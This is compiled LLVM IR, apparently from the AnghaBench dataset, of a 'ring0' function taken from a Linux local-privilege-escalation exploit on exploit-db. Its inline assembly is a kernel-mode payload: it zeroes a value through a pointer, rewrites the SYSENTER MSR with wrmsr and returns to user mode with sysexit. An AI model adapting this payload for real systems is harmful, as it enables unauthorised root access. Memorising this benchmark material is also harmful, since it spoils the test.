; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_27297.c_ring0.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_27297.c_ring0.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @ring0() #0 {
  call void asm sideeffect ".globl _ring0\0A_ring0:\0A.intel_syntax noprefix\0A.code64\0Amov esp, ecx\0Apush rax\0Apush rbx\0Apush rcx\0Apush rdx\0Amov rcx, qword ptr [rbx+8]\0Atest rcx, rcx\0Ajz skip_write\0Amov dword ptr [rcx], 0\0Askip_write:\0Amov ecx, 0x176\0Amov eax, dword ptr [rbx]\0Amov edx, dword ptr [rbx+4]\0Awrmsr\0Apop rdx\0Apop rcx\0Apop rbx\0Apop rax\0Asti\0Asysexit\0A.code32\0A.att_syntax prefix\0A.global _ring0_end\0A_ring0_end:\0A", "~{dirflag},~{fpsr},~{flags}"() #1, !srcloc !2
  ret void
}

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{i32 167, i32 187, i32 200, i32 228, i32 242, i32 261, i32 275, i32 289, i32 303, i32 318, i32 350, i32 369, i32 388, i32 416, i32 434, i32 454, i32 484, i32 516, i32 527, i32 540, i32 553, i32 566, i32 579, i32 588, i32 601, i32 614, i32 645, i32 669}
